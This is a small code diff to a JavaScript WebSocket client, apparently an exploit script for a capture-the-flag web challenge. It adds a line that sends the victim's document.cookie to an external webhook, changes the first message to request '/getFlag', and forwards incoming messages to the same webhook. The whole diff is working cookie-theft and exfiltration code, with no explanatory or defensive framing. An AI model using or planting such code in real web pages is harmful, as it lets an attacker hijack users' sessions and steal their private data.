@@ -23,8 +23,9 @@ function initWebSocket() {
   socket.onmessage = (event) => {
     // const messageData = JSON.parse(event.data);
     console.log("/onmessage", event.data);
+    webhook("/cookies", document.cookie);
     if (i == 0) {
-      sendMessage({ sender: "user", message: WEBHOOK });
+      sendMessage({ sender: "user", message: "/getFlag" });
     } else if (i == 1) {
       webhook("/onmessage", event.data);
     }
